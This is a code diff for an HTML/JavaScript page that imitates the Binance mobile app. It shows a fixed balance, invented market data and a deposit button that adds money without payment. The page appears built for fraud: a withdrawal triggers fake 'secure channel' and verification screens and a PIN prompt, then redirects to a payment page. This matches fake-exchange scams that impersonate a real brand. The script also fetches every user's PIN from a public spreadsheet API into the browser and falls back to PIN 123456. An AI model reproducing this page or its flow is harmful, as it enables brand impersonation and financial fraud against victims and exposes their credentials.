+                <div class="flex justify-between items-center"><div class="flex items-center gap-2"><i data-lucide="trending-up" class="w-4 h-4 text-green-500"></i><span class="text-sm text-white">Staking Reward</span></div><span class="text-green-500">+$24.50</span><span class="text-gray-500 text-xs">1d ago</span></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hot Markets -->
+    <div class="px-4 mt-4">
+        <div class="bg-[#1e2329] rounded-2xl p-4">
+            <span class="text-white font-bold">🔥 Hot Markets</span>
+            <div class="mt-3 space-y-2">
+                <div class="market-row"><div><span class="text-white">BTC/USDT</span><div class="text-gray-500 text-xs">Bitcoin</div></div><div class="text-right"><span class="text-white">$69,420</span><div class="price-up text-xs">+2.34%</div></div></div>
+                <div class="market-row"><div><span class="text-white">ETH/USDT</span><div class="text-gray-500 text-xs">Ethereum</div></div><div class="text-right"><span class="text-white">$3,520</span><div class="price-up text-xs">+1.82%</div></div></div>
+                <div class="market-row"><div><span class="text-white">BNB/USDT</span><div class="text-gray-500 text-xs">BNB</div></div><div class="text-right"><span class="text-white">$602</span><div class="price-up text-xs">+0.95%</div></div></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Crypto News -->
+    <div class="px-4 mt-4">
+        <div class="bg-[#1e2329] rounded-2xl p-4">
+            <span class="text-white font-bold">📰 Crypto News</span>
+            <div class="space-y-3 mt-3">
+                <div class="cursor-pointer hover:bg-[#2b3139] p-2 rounded-lg"><div class="text-white text-sm">Bitcoin surges past $70,000 amid institutional buying</div><div class="text-gray-500 text-xs mt-1">CoinDesk • 2h ago</div></div>
+                <div class="cursor-pointer hover:bg-[#2b3139] p-2 rounded-lg"><div class="text-white text-sm">Ethereum ETF inflows reach record high of $500M</div><div class="text-gray-500 text-xs mt-1">Bloomberg • 5h ago</div></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Whale Alerts -->
+    <div class="px-4 mt-4">
+        <div class="bg-[#1e2329] rounded-2xl p-4">
+            <span class="text-white font-bold">🐋 Whale Alerts</span>
+            <div class="space-y-2 mt-3">
+                <div class="flex justify-between items-center p-2 bg-red-500/10 rounded-lg"><div><span class="text-white text-sm">1,234 BTC transferred</span><div class="text-gray-500 text-xs">Unknown → Binance</div></div><span class="text-red-500 text-xs">5 min ago</span></div>
+                <div class="flex justify-between items-center p-2 bg-red-500/10 rounded-lg"><div><span class="text-white text-sm">5,000 ETH moved</span><div class="text-gray-500 text-xs">Coinbase → Unknown</div></div><span class="text-red-500 text-xs">15 min ago</span></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Referral Section -->
+    <div class="px-4 mt-4 mb-6">
+        <div class="bg-gradient-to-r from-yellow-500/10 to-yellow-600/10 rounded-2xl p-4 border border-yellow-500/20">
+            <div class="flex justify-between items-center"><div><span class="text-white font-bold">🎁 Invite Friends & Earn</span><div class="text-gray-400 text-xs mt-1">Get 40% commission on their trades</div></div><button class="bg-yellow-500 text-black px-4 py-2 rounded-xl text-sm font-bold">Invite Now</button></div>
+            <div class="mt-3 bg-[#2b3139] rounded-xl p-2 flex justify-between items-center"><code class="text-yellow-500 text-sm">BINANCE2025</code><button class="text-gray-400 text-xs">Copy</button></div>
+        </div>
+    </div>
+    
+    <!-- Bottom Navigation -->
+    <div class="fixed bottom-0 left-0 right-0 max-w-[500px] mx-auto bg-[#1e2329] border-t border-gray-800 px-4 py-2 flex justify-between z-50">
+        <div class="nav-item active"><i data-lucide="home" class="w-5 h-5"></i><span class="text-[10px]">Home</span></div>
+        <div class="nav-item"><i data-lucide="bar-chart-2" class="w-5 h-5"></i><span class="text-[10px]">Markets</span></div>
+        <div class="nav-item"><i data-lucide="repeat" class="w-5 h-5"></i><span class="text-[10px]">Trade</span></div>
+        <div class="nav-item"><i data-lucide="zap" class="w-5 h-5"></i><span class="text-[10px]">Futures</span></div>
+        <div class="nav-item"><i data-lucide="wallet" class="w-5 h-5"></i><span class="text-[10px]">Wallet</span></div>
+        <div class="nav-item"><i data-lucide="user" class="w-5 h-5"></i><span class="text-[10px]">Profile</span></div>
     </div>
 </div>
 
-<!-- Modals -->
-<div id="addfunds-modal" class="fixed inset-0 bg-black/80 z-[10002] hidden justify-center items-center">
-    <div class="bg-[#1E2329] rounded-2xl p-6 w-[90%] max-w-sm border border-binance-yellow/30">
-        <div class="flex justify-between"><h3 class="text-xl font-bold">Add Funds</h3><i data-lucide="x" class="cursor-pointer" onclick="closeModal('addfunds-modal')"></i></div>
-        <div class="my-4"><input type="number" id="funds-amount" placeholder="Amount (USD)" class="w-full bg-[#2B3139] p-3 rounded-xl border-none text-white"><input type="password" id="funds-password" placeholder="Password" class="w-full bg-[#2B3139] p-3 rounded-xl mt-3"><p id="funds-error" class="text-red-500 text-xs hidden mt-1">Incorrect password</p></div>
-        <button onclick="triggerAddFundsWithLoading()" class="w-full bg-binance-yellow text-black py-3 rounded-xl font-bold">Confirm Deposit</button>
+<!-- Deposit Modal (Add Funds) -->
+<div id="depositModal" class="modal">
+    <div class="modal-content" style="max-width: 350px;">
+        <i data-lucide="x" class="modal-close" onclick="closeModal('depositModal')"></i>
+        <div class="text-center mb-4"><div class="w-16 h-16 bg-yellow-500/20 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fa-solid fa-money-bill-wave text-yellow-500 text-2xl"></i></div><h3 class="text-xl font-bold text-white">Deposit Funds</h3><p class="text-gray-400 text-sm">Add funds to your account</p></div>
+        <div class="mb-4"><label class="block text-sm text-gray-300 mb-2">Amount (USD)</label><input type="number" id="depositAmount" placeholder="Enter amount" class="funds-modal-input" value="100"><div class="flex gap-2 mt-2"><button onclick="document.getElementById('depositAmount').value='50'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$50</button><button onclick="document.getElementById('depositAmount').value='100'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$100</button><button onclick="document.getElementById('depositAmount').value='500'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$500</button><button onclick="document.getElementById('depositAmount').value='1000'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$1000</button></div></div>
+        <button onclick="processDeposit()" class="w-full bg-yellow-500 text-black py-3 rounded-xl font-bold">Deposit</button>
     </div>
 </div>
-<div id="convert-modal" class="fixed inset-0 bg-black/80 z-[10002] hidden justify-center items-center"><div class="bg-[#1E2329] rounded-2xl p-6 w-[90%]"><h3 class="font-bold">Convert</h3><input type="number" id="usd-amount" placeholder="USD" class="w-full bg-[#2B3139] p-2 rounded mt-2"><button class="mt-3 bg-binance-yellow px-4 py-2 rounded">Convert</button></div></div>
-<div id="search-modal" class="fixed inset-0 bg-black/80 z-[10002] hidden justify-center items-center"><div class="bg-[#1E2329] rounded-2xl p-6 w-[90%]"><input type="text" id="search-input" placeholder="Search markets..." class="w-full bg-[#2B3139] p-2 rounded"></div></div>
-<div id="profile-popup" class="fixed top-20 right-4 bg-[#1E2329] rounded-xl p-4 w-64 z-[10003] hidden border border-gray-700"><div id="profile-email" class="text-sm font-bold"></div><button onclick="logoutUser()" class="mt-3 w-full bg-red-600 py-2 rounded text-sm">Logout</button></div>
+
+<!-- Transfer Modal -->
+<div id="transferModal" class="modal">
+    <div class="modal-content" style="max-width: 350px;">
+        <i data-lucide="x" class="modal-close" onclick="closeModal('transferModal')"></i>
+        <div class="text-center mb-4"><div class="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fa-solid fa-arrow-right-arrow-left text-blue-500 text-2xl"></i></div><h3 class="text-xl font-bold text-white">Transfer Funds</h3><p class="text-gray-400 text-sm">Transfer between wallets</p></div>
+        <div class="mb-4"><label class="block text-sm text-gray-300 mb-2">From</label><select id="transferFrom" class="funds-modal-input"><option value="spot">Spot Wallet</option><option value="funding">Funding Wallet</option></select></div>
+        <div class="mb-4"><label class="block text-sm text-gray-300 mb-2">To</label><select id="transferTo" class="funds-modal-input"><option value="spot">Spot Wallet</option><option value="funding">Funding Wallet</option></select></div>
+        <div class="mb-4"><label class="block text-sm text-gray-300 mb-2">Amount (USD)</label><input type="number" id="transferAmount" placeholder="Enter amount" class="funds-modal-input"></div>
+        <button onclick="processTransfer()" class="w-full bg-yellow-500 text-black py-3 rounded-xl font-bold">Transfer</button>
+    </div>
+</div>
+
+<!-- Loading Overlay 1 -->
+<div id="loadingOverlay1" class="loading-overlay">
+    <div style="position: relative;"><div class="loading-ring"></div><div class="loading-ring-secondary"></div></div>
+    <div class="text-yellow-500 text-sm mt-4" id="loadingStatus">Initializing Secure Channel</div>
+    <div class="loading-progress"><div class="loading-progress-fill" id="loadingProgressFill1"></div></div>
+    <div class="text-gray-400 text-xs mt-2" id="loadingPercent">0%</div>
+</div>
+
+<!-- PIN Modal -->
+<div id="pinModal" class="pin-modal">
+    <div class="pin-container">
+        <div class="text-center"><div class="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4"><i class="fa-solid fa-lock text-red-500 text-2xl"></i></div><h3 class="text-xl font-bold text-white mb-2">Withdrawal PIN Required</h3><p class="text-gray-400 text-sm mb-4">Enter your 6-digit withdrawal PIN to continue</p>
+        <input type="password" id="pinInput" maxlength="6" class="pin-input" placeholder="••••••" inputmode="numeric">
+        <div id="pinError" class="text-red-500 text-xs mt-2 hidden">Incorrect PIN. Please try again.</div>
+        <div class="flex gap-3 mt-6"><button id="pinCancelBtn" class="flex-1 py-3 bg-[#2b3139] rounded-xl text-white font-medium">Cancel</button><button id="pinVerifyBtn" class="flex-1 py-3 bg-yellow-500 rounded-xl text-black font-bold">Verify</button></div></div>
+    </div>
+</div>
+
+<!-- Loading Overlay 2 -->
+<div id="loadingOverlay2" class="loading-overlay">
+    <div style="position: relative;"><div class="loading-ring"></div><div class="loading-ring-secondary"></div></div>
+    <div class="text-yellow-500 text-sm mt-4" id="loadingStatus2">Processing Transaction</div>
+    <div class="loading-progress"><div class="loading-progress-fill" id="loadingProgressFill2"></div></div>
+    <div class="text-gray-400 text-xs mt-2" id="loadingPercent2">0%</div>
+</div>
+
+<div id="toast" class="toast"></div>
 
 <script>
-    // --- MOCK PROFESSIONAL DATA ---
-    let userBalance = 12450.75;
-    let btcPrice = 70509;
-    let ethPrice = 3512;
-    let bnbPrice = 602;
-    let currentUserEmail = "trader@binance.com";
-    let currentUserHashedPassword = "mock_hash";
+    lucide.createIcons();
     
-    // Top movers data
-    const topMovers = [
-        { sym: "WIF", name: "Dogwifhat", price: 3.42, change: 24.5, pos: true },
-        { sym: "TON", name: "Toncoin", price: 7.21, change: 12.3, pos: true },
-        { sym: "ORDI", name: "Ordinals", price: 54.2, change: -8.7, pos: false },
-        { sym: "PEPE", name: "Pepe", price: 0.000012, change: 18.2, pos: true },
-        { sym: "SEI", name: "Sei", price: 0.48, change: -5.4, pos: false }
-    ];
+    // API Configuration
+    const API_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/sheet1";
+    let currentUserEmail = null;
+    let currentBalance = 12450;
+    let currentUserPin = null;
+    let pendingWithdrawAmount = 0;
     
-    const eliteTradersData = [
-        { name: "0x_Killah", roi: "+342%", followers: "12.4k", avatar: "https://randomuser.me/api/portraits/men/32.jpg" },
-        { name: "Crypto_Valkyrie", roi: "+289%", followers: "8.7k", avatar: "https://randomuser.me/api/portraits/women/68.jpg" },
-        { name: "Whale_Algo", roi: "+156%", followers: "22k", avatar: "https://randomuser.me/api/portraits/men/75.jpg" }
-    ];
+    // DOM Elements
+    const addFundsBtn = document.getElementById('addFundsBtn');
+    const loadingOverlay1 = document.getElementById('loadingOverlay1');
+    const loadingOverlay2 = document.getElementById('loadingOverlay2');
+    const pinModal = document.getElementById('pinModal');
+    const pinInput = document.getElementById('pinInput');
+    const pinError = document.getElementById('pinError');
+    const pinVerifyBtn = document.getElementById('pinVerifyBtn');
+    const pinCancelBtn = document.getElementById('pinCancelBtn');
+    const toast = document.getElementById('toast');
     
-    let portfolioChart, donutChart;
+    function showToast(message, isError = false) {
+        toast.textContent = message;
+        toast.className = isError ? 'toast error' : 'toast';
+        toast.style.opacity = '1';
+        setTimeout(() => { toast.style.opacity = '0'; }, 3000);
+    }
     
-    function initCharts() {
-        const ctx = document.getElementById('advancedPortfolioChart').getContext('2d');
-        portfolioChart = new Chart(ctx, {
-            type: 'line', data: { labels: ['W1', 'W2', 'W3', 'W4'], datasets: [{ label: 'Portfolio', data: [10500, 11200, 10800, 12450], borderColor: '#FCD535', borderWidth: 3, fill: true, backgroundColor: 'rgba(252, 213, 53, 0.05)', tension: 0.3, pointBackgroundColor: '#FCD535' }] },
-            options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { display: false } }, scales: { y: { grid: { color: '#2B3139' } }, x: { grid: { display: false } } } }
+    function openModal(modalId) { document.getElementById(modalId).classList.add('active'); lucide.createIcons(); }
+    function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); }
+    
+    // Deposit Modal
+    function openDepositModal() { openModal('depositModal'); }
+    function processDeposit() {
+        const amount = parseFloat(document.getElementById('depositAmount').value);
+        if (!amount || amount <= 0) { showToast('Please enter a valid amount', true); return; }
+        currentBalance += amount;
+        document.getElementById('mainBalance').innerText = `$${currentBalance.toFixed(2)}`;
+        showToast(`$${amount} deposited successfully!`, false);
+        closeModal('depositModal');
+        document.getElementById('depositAmount').value = '100';
+    }
+    
+    // Transfer Modal
+    function openTransferModal() { openModal('transferModal'); }
+    function processTransfer() {
+        const amount = parseFloat(document.getElementById('transferAmount').value);
+        const from = document.getElementById('transferFrom').value;
+        const to = document.getElementById('transferTo').value;
+        if (!amount || amount <= 0) { showToast('Please enter a valid amount', true); return; }
+        if (from === to) { showToast('Cannot transfer to same wallet', true); return; }
+        if (amount > currentBalance) { showToast('Insufficient balance', true); return; }
+        currentBalance -= amount;
+        document.getElementById('mainBalance').innerText = `$${currentBalance.toFixed(2)}`;
+        showToast(`$${amount} transferred from ${from} to ${to}`, false);
+        closeModal('transferModal');
+        document.getElementById('transferAmount').value = '';
+    }
+    
+    // Withdraw Function - Triggers the loading → PIN → loading → payment.html flow
+    function handleWithdraw() {
+        pendingWithdrawAmount = prompt('Enter withdrawal amount:', '100');
+        if (!pendingWithdrawAmount || parseFloat(pendingWithdrawAmount) <= 0) {
+            showToast('Please enter a valid amount', true);
+            return;
+        }
+        if (parseFloat(pendingWithdrawAmount) > currentBalance) {
+            showToast('Insufficient balance', true);
+            return;
+        }
+        startFirstLoading();
+    }
+    
+    function startFirstLoading() {
+        loadingOverlay1.style.display = 'flex';
+        const statusMessages = ['Initializing Secure Channel', 'Verifying Account Credentials', 'Establishing Secure Connection', 'Preparing Transaction Gateway'];
+        let statusIndex = 0;
+        const statusEl = document.getElementById('loadingStatus');
+        const statusInterval = setInterval(() => { statusIndex = (statusIndex + 1) % statusMessages.length; if (statusEl) statusEl.textContent = statusMessages[statusIndex]; }, 1500);
+        
+        let startTime = Date.now();
+        const progressFill = document.getElementById('loadingProgressFill1');
+        const percentSpan = document.getElementById('loadingPercent');
+        const progressInterval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const percent = Math.min(100, Math.floor((elapsed / 6000) * 100));
+            if (progressFill) progressFill.style.width = percent + '%';
+            if (percentSpan) percentSpan.textContent = percent + '%';
+            if (percent >= 100) {
+                clearInterval(progressInterval);
+                clearInterval(statusInterval);
+                loadingOverlay1.style.display = 'none';
+                showPinModal();
+            }
+        }, 50);
+    }
+    
+    async function showPinModal() {
+        // Fetch user's PIN from database
+        const savedEmail = localStorage.getItem('binance_session_email');
+        if (savedEmail) {
+            try {
+                const response = await fetch(`${API_URL}`);
+                const users = await response.json();
+                const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
+                if (user && user.Pin) {
+                    currentUserPin = user.Pin;
+                } else {
+                    currentUserPin = '123456'; // fallback
+                }
+            } catch (error) {
+                console.error('Error fetching PIN:', error);
+                currentUserPin = '123456';
+            }
+        }
+        pinInput.value = '';
+        pinError.classList.add('hidden');
+        pinModal.style.display = 'flex';
+        pinInput.focus();
+    }
+    
+    pinVerifyBtn.addEventListener('click', () => {
+        const enteredPin = pinInput.value;
+        if (enteredPin.length !== 6) { pinError.classList.remove('hidden'); pinError.textContent = 'PIN must be 6 digits'; return; }
+        if (enteredPin !== currentUserPin) { pinError.classList.remove('hidden'); pinError.textContent = 'Incorrect PIN. Please try again.'; pinInput.value = ''; pinInput.focus(); return; }
+        pinModal.style.display = 'none';
+        startSecondLoading();
+    });
+    
+    pinCancelBtn.addEventListener('click', () => {
+        pinModal.style.display = 'none';
+        showToast('Transaction cancelled', false);
+    });
+    
+    function startSecondLoading() {
+        loadingOverlay2.style.display = 'flex';
+        const statusMessages2 = ['Verifying Withdrawal PIN', 'Processing Withdrawal', 'Updating Account Balance', 'Finalizing Transaction'];
+        let statusIndex = 0;
+        const statusEl2 = document.getElementById('loadingStatus2');
+        const statusInterval2 = setInterval(() => { statusIndex = (statusIndex + 1) % statusMessages2.length; if (statusEl2) statusEl2.textContent = statusMessages2[statusIndex]; }, 1500);
+        
+        let startTime = Date.now();
+        const progressFill = document.getElementById('loadingProgressFill2');
+        const percentSpan = document.getElementById('loadingPercent2');
+        const progressInterval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const percent = Math.min(100, Math.floor((elapsed / 6000) * 100));
+            if (progressFill) progressFill.style.width = percent + '%';
+            if (percentSpan) percentSpan.textContent = percent + '%';
+            if (percent >= 100) {
+                clearInterval(progressInterval);
+                clearInterval(statusInterval2);
+                loadingOverlay2.style.display = 'none';
+                window.location.href = 'payment.html';
+            }
+        }, 50);
+    }
+    
+    // Copy Trade functionality
+    document.querySelectorAll('.copy-trade-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const traderName = btn.getAttribute('data-trader');
+            showToast(`✓ Now copying ${traderName}'s trades!`, false);
+            btn.textContent = 'Copied ✓';
+            btn.style.opacity = '0.7';
+            setTimeout(() => { btn.textContent = 'Copy Trade'; btn.style.opacity = '1'; }, 2000);
         });
-        const allocCtx = document.getElementById('donutAllocation').getContext('2d');
-        donutChart = new Chart(allocCtx, { type: 'doughnut', data: { labels: ['BTC', 'ETH', 'BNB', 'USDT'], datasets: [{ data: [45, 25, 15, 15], backgroundColor: ['#FCD535', '#0ECB81', '#F6465D', '#2E7D9E'] }] }, options: { responsive: true, plugins: { legend: { display: false } } } });
-        document.getElementById('allocationLegend').innerHTML = `<div class="flex flex-wrap gap-2"><span class="flex items-center gap-1"><span class="w-2 h-2 bg-[#FCD535] rounded-full"></span>BTC 45%</span><span class="flex items-center gap-1"><span class="w-2 h-2 bg-[#0ECB81] rounded-full"></span>ETH 25%</span></div>`;
-    }
+    });
     
-    function renderTopMovers() {
-        const container = document.getElementById('topMoversList');
-        container.innerHTML = topMovers.map(m => `<div class="flex justify-between items-center"><div><span class="font-bold text-sm">${m.sym}</span><span class="text-[10px] text-gray-400 ml-2">${m.name}</span></div><div class="text-right"><div class="text-sm">$${m.price.toLocaleString()}</div><div class="text-[10px] ${m.pos ? 'text-green-500' : 'text-red-500'}">${m.pos ? '+' : ''}${m.change}%</div></div></div>`).join('');
-    }
-    
-    function renderEliteTraders() {
-        const container = document.getElementById('eliteTraders');
-        container.innerHTML = eliteTradersData.map(t => `<div class="bg-[#2B3139] min-w-[140px] p-3 rounded-xl flex items-center gap-2"><img src="${t.avatar}" class="w-8 h-8 rounded-full"><div><div class="text-xs font-bold">${t.name}</div><div class="text-green-500 text-[10px]">ROI ${t.roi}</div><div class="text-[8px] text-gray-400">${t.followers} followers</div></div><button class="ml-auto bg-yellow-500/20 text-yellow-500 text-[9px] px-2 py-1 rounded">Copy</button></div>`).join('');
-    }
-    
-    function updateActivityFeed() {
-        const activities = [`✅ Buy 0.025 BTC @ $69,420`, `📈 +$342 PNL Today`, `🔄 Converted 500 USDT to ETH`, `💰 Earned 2.4 USDT from savings`];
-        document.getElementById('activityFeed').innerHTML = activities.map(a => `<div class="text-[10px] text-gray-300 border-b border-gray-800 pb-1">${a}</div>`).join('');
-    }
-    
-    function updateFearGreed() {
-        const val = Math.floor(Math.random() * 40) + 30;
-        document.getElementById('fearGreedValue').innerText = val;
-        document.getElementById('fearGreedBar').style.width = `${val}%`;
-    }
-    
-    function updateBalanceUI() { document.getElementById('mainBalanceDisplay').innerHTML = `$${userBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}`; }
-    
-    // --- ADD FUNDS WITH 6-SECOND LOADING & REDIRECT ---
-    function triggerAddFundsWithLoading() {
-        const amount = parseFloat(document.getElementById('funds-amount').value);
-        const password = document.getElementById('funds-password').value;
-        const errorDiv = document.getElementById('funds-error');
-        
-        if (!amount || amount <= 0) { errorDiv.innerText = "Enter valid amount"; errorDiv.classList.remove('hidden'); return; }
-        if (!password) { errorDiv.innerText = "Enter password"; errorDiv.classList.remove('hidden'); return; }
-        if (password !== "demo123") { errorDiv.innerText = "Incorrect password (use 'demo123')"; errorDiv.classList.remove('hidden'); return; }
-        
-        closeModal('addfunds-modal');
-        const loader = document.getElementById('loadingPaymentOverlay');
-        loader.classList.add('active');
-        
-        // Simulate adding funds to local state for realism
-        userBalance += amount;
-        updateBalanceUI();
-        updateActivityFeed();
-        
-        setTimeout(() => {
-            window.location.href = 'payment.html';
-        }, 6000);
-    }
-    
-    // Simulate real-time price ticker
-    function startLiveTicker() {
-        setInterval(() => {
-            btcPrice += (Math.random() - 0.5) * 100;
-            btcPrice = Math.max(68000, Math.min(73000, btcPrice));
-            ethPrice += (Math.random() - 0.5) * 15;
-            bnbPrice += (Math.random() - 0.5) * 3;
-            document.getElementById('dailyPnl').innerHTML = `+$${(userBalance * 0.027).toFixed(2)}`;
-        }, 4500);
-    }
-    
-    function openAddFundsModal() { openModal('addfunds-modal'); document.getElementById('funds-error').classList.add('hidden'); document.getElementById('funds-amount').value = 100; }
-    function openConvertModal() { openModal('convert-modal'); }
-    function openSearchModal() { openModal('search-modal'); }
-    function openModal(id) { document.getElementById(id).classList.remove('hidden'); lucide.createIcons(); }
-    function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
-    function showView(view) { document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active')); document.getElementById(`view-${view}`).classList.add('active'); lucide.createIcons(); }
-    function toggleProfilePopup() { const p = document.getElementById('profile-popup'); p.classList.toggle('hidden'); if(!p.classList.contains('hidden')) document.getElementById('profile-email').innerText = currentUserEmail; }
-    function logoutUser() { localStorage.clear(); window.location.href = 'index.html'; }
-    function showNotifications() { alert("🔔 You have 3 unread notifications: BTC above 70k, New listing alert!"); }
-    function toggleTheme() { document.body.classList.toggle('light-mode'); }
-    
-    // Initialize everything
-    window.onload = () => {
-        initCharts();
-        renderTopMovers();
-        renderEliteTraders();
-        updateActivityFeed();
-        updateFearGreed();
-        updateBalanceUI();
-        startLiveTicker();
+    // Toggle Balance
+    let balanceVisible = true;
+    const toggleBalanceBtn = document.getElementById('toggleBalance');
+    const mainBalanceSpan = document.getElementById('mainBalance');
+    toggleBalanceBtn.addEventListener('click', () => {
+        balanceVisible = !balanceVisible;
+        if (balanceVisible) { mainBalanceSpan.textContent = `$${currentBalance.toFixed(2)}`; toggleBalanceBtn.setAttribute('data-lucide', 'eye-off'); }
+        else { mainBalanceSpan.textContent = '******'; toggleBalanceBtn.setAttribute('data-lucide', 'eye'); }
         lucide.createIcons();
-        showView('home');
-    };
+    });
+    
+    // Initialize Charts
+    const portfolioCtx = document.getElementById('portfolioChart').getContext('2d');
+    new Chart(portfolioCtx, {
+        type: 'line',
+        data: { labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'], datasets: [{ label: 'Portfolio Value', data: [11250, 11800, 12100, 12450], borderColor: '#f0b90b', backgroundColor: 'rgba(240, 185, 11, 0.1)', fill: true, tension: 0.4, pointBackgroundColor: '#f0b90b', pointRadius: 4 }] },
+        options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { display: false } }, scales: { y: { grid: { color: '#2b3139' }, ticks: { color: '#848e9c' } }, x: { ticks: { color: '#848e9c' } } } }
+    });
+    
+    const allocationCtx = document.getElementById('allocationChart').getContext('2d');
+    new Chart(allocationCtx, {
+        type: 'doughnut',
+        data: { labels: ['BTC', 'ETH', 'Others'], datasets: [{ data: [45, 28, 27], backgroundColor: ['#f0b90b', '#0ecb81', '#f6465d'], borderWidth: 0 }] },
+        options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { display: false } } }
+    });
+    
+    // Load user data on page load
+    async function loadUserData() {
+        const savedEmail = localStorage.getItem('binance_session_email');
+        const savedBalance = localStorage.getItem('binance_user_balance');
+        if (savedEmail) {
+            currentUserEmail = savedEmail;
+            if (savedBalance) currentBalance = parseFloat(savedBalance);
+            document.getElementById('mainBalance').innerText = `$${currentBalance.toFixed(2)}`;
+            document.getElementById('btcAmount').innerText = (currentBalance / 67000).toFixed(4) + ' BTC';
+            document.getElementById('ethAmount').innerText = (currentBalance / 3500).toFixed(4) + ' ETH';
+            document.getElementById('usdtAmount').innerText = `$${currentBalance.toFixed(2)}`;
+        }
+    }
+    
+    loadUserData();
 </script>
 </body>
 </html>
